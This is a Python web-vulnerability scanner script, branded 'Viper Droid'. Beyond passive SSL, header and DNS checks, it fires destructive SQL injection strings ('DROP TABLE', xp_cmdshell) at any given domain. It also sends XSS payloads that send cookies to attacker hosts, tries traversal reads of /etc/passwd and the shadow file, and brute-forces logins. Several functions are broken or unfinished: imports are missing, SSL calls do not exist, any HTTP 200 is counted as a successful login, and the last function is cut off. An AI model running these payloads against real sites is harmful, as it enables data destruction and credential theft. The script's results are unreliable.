import socket
import ssl
import requests
from urllib.parse import urlparse
import dns.resolver
import nmap
import os
import time
import subprocess
import shutil
import nmap
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from itertools import product
import string

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    print("""
     ██╗   ██╗██╗██████╗ ███████╗███████╗██████╗ 
    ██║   ██║██║██╔══██╗██╔════╝██╔════╝██╔══██╗
    ██║   ██║██║██████╔╝█████╗  █████╗  ██████╔╝
    ██║   ██║██║██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗
    ╚██████╔╝██║██║     ███████╗███████╗██║  ██║
     ╚═════╝ ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝
    Powered by Viper Droid

    """)


# 1. SSL Certificate Check - Enhanced Version
def check_ssl_certificate(domain):
    try:
        context = ssl.create_default_context()

        # Create a socket connection to the domain on port 443 (HTTPS)
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                # Fetch the certificate
                cert = ssock.getpeercert()

                # Extract certificate details
                issuer = cert.get('issuer', [])
                subject = cert.get('subject', [])
                not_before = cert.get('notBefore', '')
                not_after = cert.get('notAfter', '')
                cert_version = cert.get('version', '')
                public_key = ssock.getpeercertchain()[-1]
                cipher = ssock.cipher()

                # Convert date strings to datetime objects
                not_before_dt = datetime.strptime(not_before, "%Y%m%d%H%M%SZ")
                not_after_dt = datetime.strptime(not_after, "%Y%m%d%H%M%SZ")

                # Current date for expiration check
                current_date = datetime.utcnow()
                expired = current_date > not_after_dt
                valid = current_date > not_before_dt

                print(f"SSL Certificate for {domain}:")
                print(f"  Issuer: {issuer}")
                print(f"  Subject: {subject}")
                print(f"  Not Before: {not_before_dt}")
                print(f"  Not After: {not_after_dt}")
                print(f"  Certificate Expired: {'Yes' if expired else 'No'}")
                print(f"  Certificate Valid: {'Yes' if valid else 'No'}")
                print(f"  Certificate Version: {cert_version}")

                # Check if certificate matches domain
                if domain.lower() not in [item[0][1] for item in subject]:
                    print(f"Warning: The certificate does not match the domain {domain}.")

                # TLS Version and Cipher Suite
                if cipher:
                    print(f"  TLS Version: {cipher[0]}")
                    print(f"  Cipher Suite: {cipher[1]}")

                # Public Key Size
                if public_key:
                    key_size = public_key[0].bit_length()  # Get the public key bit length
                    print(f"  Public Key Size: {key_size} bits")
                else:
                    print("  Public Key: Not available")

    except ssl.SSLError as e:
        print(f"SSL Error: {e}")
    except socket.error as e:
        print(f"Socket Error: {e}")
    except Exception as e:
        print(f"Error checking SSL certificate: {e}")


# 2. HTTP Header Security Check - Enhanced Version
def check_headers(domain):
    try:
        # Make a GET request to the domain over HTTPS with a timeout
        response = requests.get(f"https://{domain}", timeout=5, verify=False)

        print(f"HTTP Headers for {domain}:")

        if response.status_code == 200:
            # Display all headers
            for header, value in response.headers.items():
                print(f"  {header}: {value}")

            # Strict-Transport-Security Header Check
            if 'Strict-Transport-Security' in response.headers:
                hsts_header = response.headers['Strict-Transport-Security']
                print(f"  Strict-Transport-Security: {hsts_header}")
                # Check for max-age parameter
                if 'max-age=' not in hsts_header:
                    print("Warning: Missing max-age in Strict-Transport-Security header!")
            else:
                print("Warning: Missing Strict-Transport-Security header!")

            # Content-Security-Policy Header Check
            if 'Content-Security-Policy' in response.headers:
                print(f"  Content-Security-Policy: {response.headers['Content-Security-Policy']}")
            else:
                print("Warning: Missing Content-Security-Policy header!")

            # X-Content-Type-Options Header Check
            if 'X-Content-Type-Options' not in response.headers:
                print("Warning: Missing X-Content-Type-Options header!")
            else:
                print(f"  X-Content-Type-Options: {response.headers['X-Content-Type-Options']}")

            # X-Frame-Options Header Check
            if 'X-Frame-Options' not in response.headers:
                print("Warning: Missing X-Frame-Options header!")
            else:
                print(f"  X-Frame-Options: {response.headers['X-Frame-Options']}")

            # X-XSS-Protection Header Check
            if 'X-XSS-Protection' not in response.headers:
                print("Warning: Missing X-XSS-Protection header!")
            else:
                print(f"  X-XSS-Protection: {response.headers['X-XSS-Protection']}")

            # Referrer-Policy Header Check
            if 'Referrer-Policy' not in response.headers:
                print("Warning: Missing Referrer-Policy header!")
            else:
                print(f"  Referrer-Policy: {response.headers['Referrer-Policy']}")

            # Feature-Policy Header Check
            if 'Feature-Policy' in response.headers:
                print(f"  Feature-Policy: {response.headers['Feature-Policy']}")
            else:
                print("Warning: Missing Feature-Policy header!")

            # Server Header Check
            if 'Server' in response.headers:
                print(f"  Server: {response.headers['Server']}")
            else:
                print("Warning: Missing Server header!")

            # Cookie Settings Check
            if 'Set-Cookie' in response.headers:
                cookies = response.headers['Set-Cookie']
                secure = 'Secure' in cookies
                httponly = 'HttpOnly' in cookies
                samesite = 'SameSite=' in cookies

                print("  Cookie Settings:")
                print(f"    Secure: {'Yes' if secure else 'No'}")
                print(f"    HttpOnly: {'Yes' if httponly else 'No'}")
                print(f"    SameSite: {'Present' if samesite else 'Not present'}")

                if not secure:
                    print("Warning: Cookies are not set with Secure flag!")
                if not httponly:
                    print("Warning: Cookies are not set with HttpOnly flag!")
                if not samesite:
                    print("Warning: Cookies are not set with SameSite attribute!")

        else:
            print(f"Error: Unable to get headers, status code {response.status_code}")

    except requests.RequestException as e:
        print(f"Error fetching headers for {domain}: {e}")


# 3. Enhanced Port Scan (Using Nmap)
def port_scan(domain, ports='1-65535', aggressive=False, udp=False, save_to_file=False):
    try:
        print(f"Starting port scan for {domain}...")

        nm = nmap.PortScanner()

        # Build scan arguments
        scan_args = ''
        if aggressive:
            scan_args += '-A '  # Aggressive scan (OS detection, version detection, etc.)
        if udp:
            scan_args += '-sU '  # UDP scan
        else:
            scan_args += '-sT '  # TCP scan

        # Run the scan
        nm.scan(domain, ports, arguments=scan_args)

        # Print and save scan results
        print(f"Scan results for {domain}:")

        if domain in nm.all_hosts():
            for protocol in nm[domain].all_protocols():
                print(f"  Protocol: {protocol}")
                for port in nm[domain][protocol].keys():
                    state = nm[domain][protocol][port]['state']
                    print(f"    Port: {port} is {state}")

                    # If aggressive scan is enabled, display service and version info
                    if aggressive:
                        service = nm[domain][protocol][port].get('name', 'N/A')
                        version = nm[domain][protocol][port].get('version', 'N/A')
                        print(f"      Service: {service}")
                        print(f"      Version: {version}")

            # OS detection if aggressive scan was requested
            if aggressive and 'osmatch' in nm[domain]:
                print("\nOS Detection:")
                for os in nm[domain]['osmatch']:
                    print(f"  OS: {os['name']}")

            # Save results to a file if required
            if save_to_file:
                with open(f"{domain}_port_scan_results.txt", 'w') as f:
                    f.write(str(nm[domain]))
                print(f"\nScan results saved to {domain}_port_scan_results.txt")
        else:
            print(f"Error: {domain} is unreachable or no ports were open.")

    except Exception as e:
        print(f"Error performing port scan: {e}")


# 4. SQL Injection Check
def check_sql_injection(domain):
    test_urls = [
        f"http://{domain}/?id=1' OR '1'='1",
        f"http://{domain}/?id=1' UNION SELECT null, null, null--",
        f"http://{domain}/?id=1' AND '1'='1",
        f"http://{domain}/?id=1' OR 1=1 LIMIT 1--",
        f"http://{domain}/?id=1' AND 1=1--",
        f"http://{domain}/?id=1' AND 1=2--",
        f"http://{domain}/?id=1' OR 1=1--",
        f"http://{domain}/?id=1' OR 'a'='a",
        f"http://{domain}/?id=1' AND 1=1#",
        f"http://{domain}/?id=1' AND 1=1/*",
        f"http://{domain}/?id=1' OR 'a'='b'--",
        f"http://{domain}/?id=1' OR 1=1;--",
        f"http://{domain}/?id=1' ORDER BY 1--",
        f"http://{domain}/?id=1' GROUP BY CONCAT(0x3a, user())--",
        f"http://{domain}/?id=1' HAVING 1=1--",
        f"http://{domain}/?id=1' DROP TABLE users--",
        f"http://{domain}/?id=1' EXEC xp_cmdshell('dir')--",
        f"http://{domain}/?id=1' WAITFOR DELAY '0:0:5'--",
        f"http://{domain}/?id=1' SELECT * FROM users--",
        f"http://{domain}/?id=1' --",
        f"http://{domain}/?id=1' OR 1=1; DROP TABLE users--",
        f"http://{domain}/?id=1' AND sleep(5)--",
        f"http://{domain}/?id=1' AND updatexml(1, '/foo/bar', 123)--",
        f"http://{domain}/?id=1' AND substr(@@version, 1, 1) = '5'--",
        f"http://{domain}/?id=1' AND (SELECT COUNT(*) FROM information_schema.tables) > 1--",
        f"http://{domain}/?id=1' AND ascii(substring(@@version,1,1)) = 53--",
    ]

    print("\n[+] Checking for SQL Injection vulnerabilities...")

    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    print(f"Possible SQL Injection vulnerability found at: {url}")
                else:
                    print(f"No SQL Injection vulnerability found at: {url}")
            else:
                print(f"Error accessing URL: {url}")
        except requests.RequestException as e:
            print(f"Error checking SQL injection at {url}: {e}")


# 5. Cross-Site Scripting (XSS) Check
def check_xss(domain):
    payloads = [
        "<script>alert(document.body.innerHTML)</script>",  # Display the body content
        "<script>window.location='javascript:alert(document.cookie)';</script>",  # Redirect with cookies alert
        "<a href='javascript:void(0)' onclick='alert(1)'>Click me</a>",  # Link with JavaScript alert
        "<a href='data:text/html,<script>alert(1)</script>'>Click me</a>",  # Data URL triggering XSS
        "<script>eval('/* XSS */alert(1));</script>",  # Eval with comment to bypass filtering
        "<script>document.write('<script>alert(1)</script>');</script>",  # Inject script using document.write
        "<script>document.write('<script src=\"http://evil.com/malicious.js\"></script>');</script>",
        # Inject script with external resource
        "<img src='x' onerror='new Image().src=\"http://attacker.com?cookie=\" + document.cookie'>",
        # XSS for stealing cookies
        "<style>@import url('http://evil.com');</style>",  # CSS import with malicious URL
        "<script>setInterval('alert(1)', 1000)</script>",  # Repeated alert using setInterval
        "<script>location.href='http://attacker.com?cookie=' + encodeURIComponent(document.cookie)</script>",
        # Redirect with cookies
        "<script>fetch('http://evil.com?cookie=' + document.cookie, {method: 'GET'})</script>",
        # Send cookies via fetch
        "<input type='text' value='x' onfocusin='alert(1)'>",  # Input field with focusin event
        "<input type='range' oninput='alert(1)'>",  # Range input field with oninput event
        "<svg/onload=alert(document.cookie)>",  # SVG tag with cookie stealing
        "<script>document.getElementById('el').innerHTML = '<img src=x onerror=alert(1)>';</script>",
        # Inject XSS dynamically into an element
        "<a href='javascript:alert(document.location)'>Click me</a>",  # XSS to alert the document location
        "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",  # Inject XSS into body content
        "<script>var x = document.createElement('img'); x.src = 'x'; x.onerror = function(){alert(1)}; document.body.appendChild(x);</script>",
        # Inject an image dynamically with XSS
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",  # Meta refresh with XSS payload
        "<form action='javascript:alert(1)'><button>Submit</button></form>",  # Form submission triggering XSS
        "<img src='http://evil.com/malicious.png' onload='alert(1)'>",  # Image onload to trigger alert
        "<input type='button' value='Click' onclick='alert(1)'>",  # Button triggering XSS on click
        "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",  # SVG with an onload event
        "<script>document.getElementsByTagName('body')[0].setAttribute('onclick','alert(1)');</script>",
        # Inject event handler to body tag
        "<script>document.getElementById('id').setAttribute('onmouseover','alert(1)');</script>",
        # Dynamically add event listener
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",  # Use iframe with srcdoc attribute for XSS
        "<script>window.localStorage.setItem('xss', 'payload'); alert(localStorage.getItem('xss'));</script>",
        # XSS using localStorage
        "<script>document.cookie='xss=true';alert(document.cookie)</script>",  # XSS to set and get cookies
        "<form action='javascript:alert(1)' method='get'><input type='submit' value='Submit'></form>",
        # Form submission XSS
        "<style>body{background-image:url('http://evil.com/xss.png');}</style>",
        # CSS background image with XSS payload
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>",  # Eval with char codes
        "<script>window.open('http://attacker.com/?cookie=' + document.cookie, '_blank');</script>",
        # Open in new tab with cookies
        "<script>window.open('javascript:alert(1)', '_self');</script>",  # Open in the same window
        "<script>window.top.location='javascript:alert(1)';</script>",  # Access top-level window and redirect to XSS
        "<a href='http://evil.com?cookie='+document.cookie>Click me</a>",  # Link to steal cookies
        "<img src='x' onerror='eval(\"alert(1)\")'>",  # Inject payload using eval inside onerror
        "<object data='http://evil.com/xss'></object>",  # Object tag loading malicious payload

        # Inject external script dynamically
        "<script>setTimeout(() => { alert('XSS') }, 1000)</script>",  # Delayed XSS using setTimeout
        "<script>var iframe = document.createElement('iframe'); iframe.src = 'http://evil.com'; document.body.appendChild(iframe);</script>",
        # Dynamically added iframe to run malicious code
        "<meta charset='UTF-8'><script>alert('XSS')</script>",  # Meta tag with script injection
        "<script>document.getElementById('form').submit();</script>",  # Form submission via injected script
        "<script>document.body.appendChild(document.createElement('script')).src = 'http://evil.com/malicious.js';</script>",
        # Inject external JS dynamically
        "<script>eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27XSS%27%29'))</script>",
        # XSS using unescape
        "<script>setInterval(function(){alert(1)}, 2000)</script>",  # Periodic alert using setInterval
        "<iframe src='http://evil.com' width='1' height='1'></iframe>",  # Invisible iframe for malicious payload
        "<script>document.write('<div><img src=x onerror=alert(1)></div>');</script>",
        # Inject div with an image inside
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    ]

    print("\n[+] Checking for Cross-Site Scripting (XSS) vulnerabilities...")

    for payload in payloads:
        test_url = f"http://{domain}/?q={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                print(f"Possible XSS vulnerability found with payload at: {test_url}")
            else:
                print(f"No XSS vulnerability found with payload at: {test_url}")
        except requests.RequestException as e:
            print(f"Error checking XSS at {test_url}: {e}")


# 6. Directory Traversal Check
def check_directory_traversal(domain):
    traversal_payloads = [
        "/../../../../etc/passwd",  # Unix/Linux password file
        "/..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL-encoded version for Unix/Linux password file
        "/..%5C..%5C..%5C..%5Cetc%5Cpasswd",
        # URL-encoded for Windows backslashes (potentially useful for Windows servers)
        "/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # Deeper traversal
        "/..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",  # Further traversal with Windows-style encoding
        "/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  # Encoded traversal
        "/%2E%2E%2F%2E%2E%2F%2E%2E%2F..%2Fetc%2Fpasswd",  # Traversing beyond the allowed directory
        "/..%252F..%252F..%252F..%252Fetc%252Fpasswd",  # Double URL encoding
        "/..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",  # Windows hosts file
        "/..%2F..%2F..%2F..%2Fboot.ini",  # Windows boot configuration file
        "/..%2F..%2F..%2F..%2Fprivate%2Fetc%2Fshadow",  # Unix/Linux shadow file
        "/..%2F..%2F..%2F..%2Fdev%2Fnull",  # Null device (potentially dangerous)
        "/..%2F..%2F..%2F..%2Ftmp%2Ffile",  # Traversing to a temporary file location
        "/..%2F..%2F..%2F..%2Fvar%2Flog%2Fsyslog",  # System log file on Unix/Linux
        "/..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Findex.html",  # Traversing to index file in web root
        "/..%2F..%2F..%2F..%2Fhome%2Fuser%2Fprivate%2Ffile.txt",  # Potential sensitive user file
        "/..%5C..%5C..%5C..%5CProgram%20Files%5Ctest.txt",  # Example of Windows path traversal
    ]

    print("\n[+] Checking for Directory Traversal vulnerabilities...")

    for payload in traversal_payloads:
        test_url = f"http://{domain}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                print(f"Possible Directory Traversal vulnerability found at: {test_url}")
            else:
                print(f"No Directory Traversal vulnerability found at: {test_url}")
        except requests.RequestException as e:
            print(f"Error checking Directory Traversal at {test_url}: {e}")


# 7. Sensitive File Exposure Check
def check_sensitive_files(domain):
    sensitive_files = [
        "/robots.txt",
        "/.git/config",
        "/.env",
        "/.htaccess",
        "/.gitignore",
        "/phpinfo.php",
        "/admin/",  # Admin panel directory, could expose sensitive admin pages
        "/wp-config.php",  # WordPress configuration file
        "/db_config.php",  # Database configuration file
        "/config.php",  # General configuration file
        "/README.md",  # Readme file, sometimes contains sensitive information
        "/license.txt",  # License file, could contain system-specific details
        "/favicon.ico",  # May reveal some information about the site
        "/phpmyadmin/",  # Database management interface, could be an easy target if exposed
        "/web.config",  # Configuration file for web servers like IIS
        "/data/",  # A directory that could contain backup or important data
        "/backup/",  # Backup directory, often mistakenly left open
        "/error_log",  # Log file that may contain valuable information about the server
        "/test.php",  # A testing PHP file that may contain debugging info
        "/logs/",  # Directory that may contain server or application logs
        "/tmp/",  # Temporary files, sometimes they might be inadvertently exposed
        "/upload/",  # Directory for file uploads, can be exploited if improperly secured
        "/admin.php",  # Another possible admin panel entry
        "/debug/",  # Debugging folder that could expose additional information
        "/config/.env",  # Environment configuration file, commonly used in various applications
        "/sql_dump.sql",  # SQL dump files containing sensitive database information
    ]

    print("\n[+] Checking for exposed sensitive files...")

    for file in sensitive_files:
        test_url = f"http://{domain}{file}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                print(f"Sensitive file found: {test_url}")
            else:
                print(f"No sensitive file found: {test_url}")
        except requests.RequestException as e:
            print(f"Error checking sensitive files at {test_url}: {e}")


# 8. Enhanced Malware Scan (Public VirusTotal API)
def scan_malware(domain):
    try:
        print(f"[+] Scanning {domain} for malware using the public VirusTotal API...")

        # Public VirusTotal API URL
        url = f"https://www.virustotal.com/api/v3/domains/{domain}"

        # Perform the request to VirusTotal (no API key required for public API)
        response = requests.get(url)

        if response.status_code == 200:
            # Parse the response JSON
            result = response.json()

            # Extract relevant information
            data = result.get("data", {})
            domain_info = data.get("attributes", {})
            last_analysis_stats = domain_info.get("last_analysis_stats", {})

            print(f"\n[+] Malware Scan Results for {domain}:")
            print(f"  Domain: {domain}")
            print(f"  Last Analysis: {domain_info.get('last_analysis_date')}")
            print(
                f"  Total Detectors: {last_analysis_stats.get('malicious', 0)} Malicious / {last_analysis_stats.get('harmless', 0)} Harmless")

            if last_analysis_stats.get("malicious", 0) > 0:
                print("\n  Detected Malicious Activity:")
                for engine, details in domain_info.get("last_analysis_results", {}).items():
                    if details["category"] == "malicious":
                        print(f"    - {engine}: {details.get('result', 'No result available')}")

            # Domain metadata (optional)
            print(f"\n  Domain Metadata:")
            print(f"    - Creation Date: {domain_info.get('created_at', 'N/A')}")
            print(f"    - Last Update: {domain_info.get('updated_at', 'N/A')}")
            print(f"    - WHOIS Info: {domain_info.get('whois', 'N/A')}")

        elif response.status_code == 403:
            print("[!] Error: Forbidden. API key required for detailed scans.")
        elif response.status_code == 400:
            print("[!] Error: Bad request. Invalid domain format.")
        else:
            print(f"[!] Error: {response.status_code}. Unable to fetch results from VirusTotal.")

    except requests.RequestException as e:
        print(f"[!] Error: Unable to perform malware scan. {e}")


# 9. Enhanced DNS Lookup
def check_dns(domain):
    print(f"[+] Performing DNS lookup for {domain}...")

    # DNS record types to check
    record_types = ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS', 'SOA', 'PTR']

    try:
        resolver = dns.resolver.Resolver()

        # Iterate over the record types
        for record_type in record_types:
            try:
                print(f"\n  [+] Querying for {record_type} records...")
                records = resolver.resolve(domain, record_type)

                if records:
                    print(f"    {record_type} records for {domain}:")
                    for record in records:
                        print(f"      {record.to_text()}")
                else:
                    print(f"    No {record_type} records found for {domain}.")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                print(f"    No {record_type} records found for {domain}.")
            except Exception as e:
                print(f"    Error querying {record_type} records: {e}")

        # Lookup authoritative name servers (NS records)
        try:
            ns_records = resolver.resolve(domain, 'NS')
            if ns_records:
                print(f"\n  [+] Authoritative Name Servers for {domain}:")
                for ns in ns_records:
                    print(f"    {ns.to_text()}")
        except Exception as e:
            print(f"    Error querying NS records: {e}")

    except Exception as e:
        print(f"Error with DNS lookup: {e}")


# 10. Enhanced WHOIS Information Check
def check_whois(domain):
    print(f"[+] Checking WHOIS information for {domain}...")

    # Retry mechanism for network issues or temporary failures
    retries = 3
    while retries > 0:
        try:
            # Fetch WHOIS information using the python-whois library
            w = whois.whois(domain)
            if w:
                # Print structured WHOIS data
                print(f"\nWHOIS Information for {domain}:\n")
                print(f"  Domain Name: {w.domain_name}")
                print(f"  Registrar: {w.registrar}")
                print(f"  Creation Date: {w.creation_date}")
                print(f"  Expiration Date: {w.expiration_date}")
                print(f"  Name Servers: {w.name_servers}")
                print(f"  Status: {w.status}")

                # Additional WHOIS fields (if available)
                if w.registrant:
                    print(f"  Registrant: {w.registrant}")
                if w.contacts:
                    print(f"  Contacts: {w.contacts}")
                break
            else:
                print(f"No WHOIS data available for {domain}.")
                break
        except whois.parser.PywhoisError as e:
            print(f"Error parsing WHOIS data: {e}")
            break
        except Exception as e:
            retries -= 1
            print(f"Error fetching WHOIS data: {e}. Retries left: {retries}")
            if retries == 0:
                print("Max retries reached. Could not fetch WHOIS data.")
            else:
                time.sleep(3)  # Wait before retrying


# 11. Enhanced HTTP Security Check (HTTP/2, HTTP/3, etc.)
def check_http_security(domain):
    print(f"[+] Checking HTTP security features for {domain}...")

    # Retry mechanism for network issues or temporary failures
    retries = 3
    while retries > 0:
        try:
            # Check for HTTP/2 and other security features over both http and https
            for protocol in ['http', 'https']:
                print(f"\nChecking {protocol.upper()}://{domain}...")

                response = requests.get(f"{protocol}://{domain}", timeout=5, verify=False)
                if response.status_code == 200:
                    # HTTP/2 Check
                    if 'http2' in response.headers.get('Upgrade', '').lower():
                        print(f"  {protocol.upper()}://{domain} supports HTTP2.")
                    else:
                        print(f"  {protocol.upper()}://{domain} does not support HTTP2.")

                    # HTTP/3 Check (optional, depends on the server configuration)
                    if 'h3' in response.headers.get('Alt-Svc', '').lower():
                        print(f"  {protocol.upper()}://{domain} supports HTTP3.")

                    # HTTP Security Headers Check
                    headers = response.headers

                    # Check for Security Headers
                    if 'Strict-Transport-Security' in headers:
                        print(f"  Strict-Transport-Security: {headers['Strict-Transport-Security']}")
                    else:
                        print(f"  Warning: Missing Strict-Transport-Security header.")

                    if 'Content-Security-Policy' in headers:
                        print(f"  Content-Security-Policy: {headers['Content-Security-Policy']}")
                    else:
                        print(f"  Warning: Missing Content-Security-Policy header.")

                    if 'X-Content-Type-Options' in headers:
                        print(f"  X-Content-Type-Options: {headers['X-Content-Type-Options']}")
                    else:
                        print(f"  Warning: Missing X-Content-Type-Options header.")

                    if 'X-Frame-Options' in headers:
                        print(f"  X-Frame-Options: {headers['X-Frame-Options']}")
                    else:
                        print(f"  Warning: Missing X-Frame-Options header.")

                    if 'X-XSS-Protection' in headers:
                        print(f"  X-XSS-Protection: {headers['X-XSS-Protection']}")
                    else:
                        print(f"  Warning: Missing X-XSS-Protection header.")

                    if 'Referrer-Policy' in headers:
                        print(f"  Referrer-Policy: {headers['Referrer-Policy']}")
                    else:
                        print(f"  Warning: Missing Referrer-Policy header.")
                else:
                    print(f"  Unable to connect to {protocol}://{domain}, status code: {response.status_code}")
                break  # Only break if successful
        except requests.RequestException as e:
            retries -= 1
            print(f"Error checking HTTP security for {domain}: {e}. Retries left: {retries}")
            if retries == 0:
                print("Max retries reached. Could not perform HTTP security check.")
            else:
                time.sleep(3)  # Wait before retrying


def track_ssl_vulnerabilities(domain):
    print(f"[+] Tracking SSL vulnerabilities for {domain}...")

    # Check SSL version support
    ssl_versions = ["TLSv1", "TLSv1.1", "TLSv1.2", "TLSv1.3"]
    for version in ssl_versions:
        try:
            context = ssl.create_default_context()
            context.options |= getattr(ssl, f'PROTOCOL_{version.upper()}')
            with socket.create_connection((domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    print(f"SSL version {version} is supported for {domain}.")
        except Exception:
            print(f"SSL version {version} is NOT supported for {domain}.")

    # Check for weak ciphers
    weak_ciphers = ['RC4', '3DES', 'DES', 'SEED', 'Camellia', 'IDEA']
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cipher = ssock.cipher()
                if any(weak_cipher in cipher[0] for weak_cipher in weak_ciphers):
                    print(f"Weak cipher detected: {cipher[0]} for {domain}.")
                else:
                    print(f"No weak cipher detected for {domain}.")
    except Exception as e:
        print(f"Error checking ciphers for {domain}: {e}")

    # Check for SSL/TLS vulnerabilities (e.g., Heartbleed, POODLE)
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                # For simplicity, checking if SSLv3 and weak protocols are disabled
                if ssock.version() == 'SSLv3':
                    print(f"SSLv3 vulnerability detected for {domain}.")
                else:
                    print(f"No SSLv3 vulnerability detected for {domain}.")
    except Exception as e:
        print(f"Error checking SSL/TLS vulnerabilities for {domain}: {e}")


def check_http_methods(domain):
    print(f"[+] Checking HTTP methods allowed for {domain}...")
    try:
        response = requests.options(f"http://{domain}", timeout=5)
        if response.status_code == 200:
            print(f"Allowed HTTP methods for {domain} (HTTP): {response.headers.get('allow')}")

        # Check for HTTPS methods as well
        response = requests.options(f"https://{domain}", timeout=5)
        if response.status_code == 200:
            print(f"Allowed HTTP methods for {domain} (HTTPS): {response.headers.get('allow')}")
        else:
            print(f"Error connecting to HTTPS for {domain}.")

    except requests.RequestException as e:
        print(f"Error checking HTTP methods for {domain}: {e}")


def check_ssl_weak_ciphers(domain):
    print(f"[+] Checking for weak SSL ciphers for {domain}...")
    weak_ciphers = [
        'RC4-SHA', 'RC4-MD5', 'SSLv2', 'SSLv3', 'TLS_RSA_WITH_3DES_EDE_CBC_SHA',
        'TLS_RSA_WITH_RC4_128_MD5', 'TLS_RSA_WITH_RC4_128_SHA'
    ]

    context = ssl.create_default_context()
    context.set_ciphers('ALL')

    try:
        # Create a connection to the domain
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                # Get the cipher used
                cipher = ssock.cipher()
                cipher_name = cipher[0]
                print(f"Current cipher used for {domain}: {cipher_name}")

                if cipher_name in weak_ciphers:
                    print(f"Warning: Weak cipher detected: {cipher_name}")
                else:
                    print(f"No weak ciphers detected for {domain}.")

    except Exception as e:
        print(f"Error checking SSL ciphers for {domain}: {e}")


def check_open_redirect(domain):
    print(f"[+] Checking for Open Redirect vulnerabilities for {domain}...")
    test_urls = [
        f"http://{domain}/?redirect=http://malicious.com",
        f"https://{domain}/?redirect=http://malicious.com",
        f"http://{domain}/?url=http://malicious.com",
        f"https://{domain}/?url=http://malicious.com",
    ]

    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            if response.url != url:
                print(f"Possible open redirect vulnerability found at: {url}")
            else:
                print(f"No open redirect vulnerability detected at: {url}")
        except requests.RequestException as e:
            print(f"Error checking open redirect at {url}: {e}")


def check_clickjacking(domain):
    print(f"[+] Checking for Clickjacking vulnerabilities for {domain}...")

    # List of URLs to check, can be expanded to check various pages
    test_urls = [f"http://{domain}/", f"https://{domain}/"]

    # Clickjacking protection headers to check for
    clickjacking_headers = ["X-Frame-Options", "Content-Security-Policy"]

    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)

            # Check if X-Frame-Options header exists and has the correct value
            if "X-Frame-Options" not in response.headers or response.headers["X-Frame-Options"] != "DENY":
                print(f"Clickjacking vulnerability found at: {url} (Missing or misconfigured X-Frame-Options)")
            else:
                print(f"No Clickjacking vulnerability found at: {url} (X-Frame-Options header present)")

            # Check Content-Security-Policy (CSP) header for frame-ancestors directive
            if "Content-Security-Policy" not in response.headers or "frame-ancestors" not in response.headers[
                "Content-Security-Policy"]:
                print(f"Clickjacking vulnerability found at: {url} (Missing or misconfigured Content-Security-Policy)")
            else:
                print(f"No Clickjacking vulnerability found at: {url} (CSP header with frame-ancestors present)")

        except requests.RequestException as e:
            print(f"Error checking Clickjacking at {url}: {e}")


def enumerate_subdomains(domain):
    print(f"[+] Enumerating subdomains for {domain}...")

    # Run Sublist3r to find subdomains
    try:
        # Ensure that Sublist3r is installed in your system or use `subfinder`/`amass` instead
        result = subprocess.check_output(['sublist3r', '-d', domain, '-o', 'subdomains.txt'], stderr=subprocess.PIPE)

        # Print the result (subdomains found)
        print(f"Subdomains for {domain} found using Sublist3r:")
        with open('subdomains.txt', 'r') as file:
            subdomains = file.readlines()
            for subdomain in subdomains:
                print(f"  {subdomain.strip()}")

        # Optionally, you can use multiple tools to increase coverage (e.g., subfinder or amass)
        # Example: Running subfinder
        # subprocess.check_output(['subfinder', '-d', domain, '-o', 'subdomains_subfinder.txt'])

        # Example: Running amass
        # subprocess.check_output(['amass', 'enum', '-d', domain, '-o', 'subdomains_amass.txt'])

    except subprocess.CalledProcessError as e:
        print(f"Error during subdomain enumeration: {e}")


def brute_force_login(domain, login_url, username_field, password_field):
    print(f"[+] Performing brute force login checks for {domain}...")

    # Define a list of common usernames and passwords for brute forcing
    usernames = ['admin', 'administrator', 'root', 'user', 'test']
    passwords = ['123456', 'password', 'admin123', 'welcome', 'letmein']

    # Create a session for persistent connections
    session = requests.Session()

    # Attempt login with different combinations of usernames and passwords
    for username, password in product(usernames, passwords):
        data = {username_field: username, password_field: password}

        try:
            # Send the login request
            response = session.post(login_url, data=data, timeout=5)

            # Check if login is successful (example: checking for a redirect or success message)
            if "Welcome" in response.text or response.status_code == 200:
                print(f"Success: Found valid credentials: Username: {username}, Password: {password}")
                return (username, password)  # Return successful login details
            else:
                print(f"Failed attempt: Username: {username}, Password: {password}")

        except requests.RequestException as e:
            print(f"Error during brute force login attempt: {e}")

    print("[-] Brute force attack failed, no valid credentials found.")
    return None


# Example check for default credentials
def check_default_credentials(domain, login_url, username_field, password_field):
    print(f"[+] Checking for default credentials at {domain}...")

